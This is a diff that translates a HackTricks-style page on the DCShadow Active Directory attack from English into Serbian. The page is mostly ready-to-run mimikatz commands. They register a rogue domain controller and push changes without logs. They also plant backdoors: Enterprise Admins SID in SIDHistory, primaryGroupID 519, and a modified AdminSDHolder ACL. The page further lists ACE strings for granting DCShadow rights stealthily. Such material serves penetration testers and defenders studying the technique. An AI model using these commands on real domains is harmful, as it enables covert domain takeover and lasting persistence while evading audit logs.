@@ -2,11 +2,10 @@
 
 # DCShadow
 
-It registers a **new Domain Controller** in the AD and uses it to **push attributes** (SIDHistory, SPNs...) on specified objects **without** leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.\
-Note that if you use wrong data, pretty ugly logs will appear.
+Registruje **novi Kontroler domena** u AD i koristi ga da **gurne atribute** (SIDHistory, SPNs...) na specificirane objekte **bez** ostavljanja bilo kakvih **logova** u vezi sa **modifikacijama**. **Potrebne su DA** privilegije i morate biti unutar **root domena**.\
+Imajte na umu da ako koristite pogrešne podatke, pojaviće se prilično ružni logovi.
 
-To perform the attack you need 2 mimikatz instances. One of them will start the RPC servers with SYSTEM privileges (you have to indicate here the changes you want to perform), and the other instance will be used to push the values:
-
+Da biste izvršili napad, potrebne su vam 2 instance mimikatz. Jedna od njih će pokrenuti RPC servere sa SYSTEM privilegijama (ovde morate naznačiti promene koje želite da izvršite), a druga instanca će se koristiti za guranja vrednosti:
 ```bash:mimikatz1 (RPC servers)
 !+
 !processtoken
@@ -16,28 +15,26 @@ lsadump::dcshadow /object:username /attribute:Description /value="My new descrip
 ```bash:mimikatz2 (push) - Needs DA or similar
 lsadump::dcshadow /push
 ```
+Napomena da **`elevate::token`** neće raditi u `mimikatz1` sesiji jer je to podiglo privilegije niti, ali nam je potrebno da podignemo **privilegiju procesa**.\
+Takođe možete odabrati i "LDAP" objekat: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
 
-Notice that **`elevate::token`** won't work in `mimikatz1` session as that elevated the privileges of the thread, but we need to elevate the **privilege of the process**.\
-You can also select and "LDAP" object: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
+Možete primeniti promene iz DA ili od korisnika sa ovim minimalnim dozvolama:
 
-You can push the changes from a DA or from a user with this minimal permissions:
+- U **objektu domena**:
+- _DS-Install-Replica_ (Dodaj/Ukloni Repliku u Domen)
+- _DS-Replication-Manage-Topology_ (Upravljanje Replikacionom Topologijom)
+- _DS-Replication-Synchronize_ (Replikaciona Sinhronizacija)
+- **Objekat Lokacija** (i njeni podobjekti) u **Konfiguracionom kontejneru**:
+- _CreateChild and DeleteChild_
+- Objekat **računara koji je registrovan kao DC**:
+- _WriteProperty_ (Ne Write)
+- **Ciljni objekat**:
+- _WriteProperty_ (Ne Write)
 
-- In the **domain object**:
-  - _DS-Install-Replica_ (Add/Remove Replica in Domain)
-  - _DS-Replication-Manage-Topology_ (Manage Replication Topology)
-  - _DS-Replication-Synchronize_ (Replication Synchornization)
-- The **Sites object** (and its children) in the **Configuration container**:
-  - _CreateChild and DeleteChild_
-- The object of the **computer which is registered as a DC**:
-  - _WriteProperty_ (Not Write)
-- The **target object**:
-  - _WriteProperty_ (Not Write)
+Možete koristiti [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) da dodelite ove privilegije korisniku bez privilegija (napomena da će ovo ostaviti neke logove). Ovo je mnogo restriktivnije od imanja DA privilegija.\
+Na primer: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Ovo znači da korisničko ime _**student1**_ kada se prijavi na mašinu _**mcorp-student1**_ ima DCShadow dozvole nad objektom _**root1user**_.
 
-You can use [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) to give these privileges to an unprivileged user (notice that this will leave some logs). This is much more restrictive than having DA privileges.\
-For example: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` This means that the username _**student1**_ when logged on in the machine _**mcorp-student1**_ has DCShadow permissions over the object _**root1user**_.
-
-## Using DCShadow to create backdoors
-
+## Korišćenje DCShadow za kreiranje zadnjih vrata
 ```bash:Set Enterprise Admins in SIDHistory to a user
 lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
 ```
@@ -52,24 +49,22 @@ lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
 #Second, add to the ACE permissions to your user and push it using DCShadow
 lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
 ```
+## Shadowception - Dodeljivanje DCShadow dozvola koristeći DCShadow (bez izmenjenih logova dozvola)
 
-## Shadowception - Give DCShadow permissions using DCShadow (no modified permissions logs)
+Moramo dodati sledeće ACE-ove sa SID-om našeg korisnika na kraju:
 
-We need to append following ACEs with our user's SID at the end:
+- Na objektu domena:
+- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
+- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
+- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
+- Na objektu računara napadača: `(A;;WP;;;UserSID)`
+- Na objektu ciljnog korisnika: `(A;;WP;;;UserSID)`
+- Na objektu Lokacije u Konfiguracionom kontejneru: `(A;CI;CCDC;;;UserSID)`
 
-- On the domain object:
-  - `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
-  - `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
-  - `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
-- On the attacker computer object: `(A;;WP;;;UserSID)`
-- On the target user object: `(A;;WP;;;UserSID)`
-- On the Sites object in Configuration container: `(A;CI;CCDC;;;UserSID)`
+Da biste dobili trenutni ACE objekta: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`
 
-To get the current ACE of an object: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`
+Obratite pažnju da u ovom slučaju treba da napravite **several changes,** ne samo jedan. Dakle, u **mimikatz1 sesiji** (RPC server) koristite parametar **`/stack` sa svakom izmenom** koju želite da napravite. Na ovaj način, biće vam potrebna samo **`/push`** jednom da izvršite sve zadržane promene na lažnom serveru.
 
-Notice that in this case you need to make **several changes,** not just one. So, in the **mimikatz1 session** (RPC server) use the parameter **`/stack` with each change** you want to make. This way, you will only need to **`/push`** one time to perform all the stucked changes in the rouge server.
-
-[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
+[**Više informacija o DCShadow na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
 
 {{#include ../../banners/hacktricks-training.md}}
-
